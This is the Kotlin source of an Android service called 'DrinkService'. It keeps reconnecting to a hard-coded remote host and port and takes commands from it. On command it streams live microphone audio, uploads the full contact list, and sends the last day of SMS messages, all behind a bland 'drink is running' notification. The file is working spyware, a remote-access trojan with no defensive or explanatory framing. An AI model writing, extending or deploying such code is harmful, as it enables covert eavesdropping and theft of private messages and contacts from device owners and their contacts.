package com.drink

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class DrinkService : Service() {

    companion object {
        const val ACTION_STATUS = "com.drink.STATUS"
        const val EXTRA_CONNECTED = "connected"
        private const val HOST = "192.168.1.149"
        private const val PORT = 33110
        private const val CHANNEL_ID = "drink_channel"
        private const val NOTIF_ID = 1
        private const val SAMPLE_RATE = 16000
        private const val RECONNECT_DELAY = 5000L
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var socketManager: SocketManager? = null
    private var micJob: Job? = null
    private var running = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!running) {
            running = true
            scope.launch { connectionLoop() }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        micJob?.cancel()
        socketManager?.close()
        scope.cancel()
        super.onDestroy()
    }

    private suspend fun connectionLoop() {
        while (running) {
            try {
                val sm = SocketManager(HOST, PORT)
                socketManager = sm
                broadcastStatus(true)
                commandLoop(sm)
            } catch (e: Exception) {
                broadcastStatus(false)
            } finally {
                socketManager?.close()
                socketManager = null
                micJob?.cancel()
                micJob = null
            }
            if (running) delay(RECONNECT_DELAY)
        }
    }

    private suspend fun commandLoop(sm: SocketManager) {
        while (running && sm.isConnected()) {
            val frame = sm.readFrame()
            when (frame.optString("cmd")) {
                "use_mic" -> handleMic(sm)
                "get_contacts" -> handleContacts(sm)
                "get_sms" -> handleSms(sm)
                "disconnect" -> {
                    micJob?.cancel()
                    sm.close()
                    return
                }
            }
        }
    }

    private fun handleMic(sm: SocketManager) {
        micJob?.cancel()
        micJob = scope.launch {
            val bufferSize = AudioRecord.getMinBufferSize(
                SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT
            )
            val recorder = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT,
                bufferSize
            )
            recorder.startRecording()
            val buffer = ByteArray(bufferSize)
            try {
                while (isActive && sm.isConnected()) {
                    val read = recorder.read(buffer, 0, buffer.size)
                    if (read > 0) {
                        val chunk = buffer.copyOf(read)
                        val header = JSONObject().apply {
                            put("type", "mic_chunk")
                            put("size", chunk.size)
                        }
                        sm.sendFrame(header, chunk)
                    }
                }
            } finally {
                recorder.stop()
                recorder.release()
            }
        }
    }

    private suspend fun handleContacts(sm: SocketManager) = withContext(Dispatchers.IO) {
        val contacts = readContacts()
        val zipBytes = buildContactsZip(contacts)
        val header = JSONObject().apply {
            put("type", "contacts")
            put("size", zipBytes.size)
        }
        sm.sendFrame(header, zipBytes)
    }

    private fun readContacts(): List<Map<String, String>> {
        val result = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
            ),
            null, null, null
        ) ?: return result
        cursor.use {
            val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val phoneIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext()) {
                result.add(mapOf(
                    "name" to (it.getString(nameIdx) ?: ""),
                    "phone" to (it.getString(phoneIdx) ?: ""),
                ))
            }
        }
        return result
    }

    private fun buildContactsZip(contacts: List<Map<String, String>>): ByteArray {
        val baos = ByteArrayOutputStream()
        ZipOutputStream(baos).use { zip ->
            zip.putNextEntry(ZipEntry("contacts.json"))
            val arr = JSONArray()
            contacts.forEach { c ->
                arr.put(JSONObject(c))
            }
            zip.write(arr.toString().toByteArray(Charsets.UTF_8))
            zip.closeEntry()
        }
        return baos.toByteArray()
    }

    private suspend fun handleSms(sm: SocketManager) = withContext(Dispatchers.IO) {
        val messages = readSms()
        val response = JSONObject().apply {
            put("type", "sms")
            put("data", messages)
        }
        sm.sendFrame(response)
    }

    private fun readSms(): JSONArray {
        val result = JSONArray()
        val since = System.currentTimeMillis() - 24 * 60 * 60 * 1000L
        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE,
            ),
            "${Telephony.Sms.DATE} > ?",
            arrayOf(since.toString()),
            "${Telephony.Sms.DATE} DESC"
        ) ?: return result
        cursor.use {
            val addrIdx = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIdx = it.getColumnIndex(Telephony.Sms.BODY)
            val dateIdx = it.getColumnIndex(Telephony.Sms.DATE)
            val typeIdx = it.getColumnIndex(Telephony.Sms.TYPE)
            while (it.moveToNext()) {
                result.put(JSONObject().apply {
                    put("address", it.getString(addrIdx) ?: "")
                    put("body", it.getString(bodyIdx) ?: "")
                    put("date", it.getLong(dateIdx))
                    put("type", it.getInt(typeIdx))
                })
            }
        }
        return result
    }

    private fun broadcastStatus(connected: Boolean) {
        val intent = Intent(ACTION_STATUS).apply {
            putExtra(EXTRA_CONNECTED, connected)
        }
        sendBroadcast(intent)
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Drink Service",
            NotificationManager.IMPORTANCE_LOW
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager.createNotificationChannel(channel)
    }

    private fun buildNotification() = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("drink")
        .setContentText("drink is running")
        .setSmallIcon(android.R.drawable.ic_dialog_info)
        .build()
}
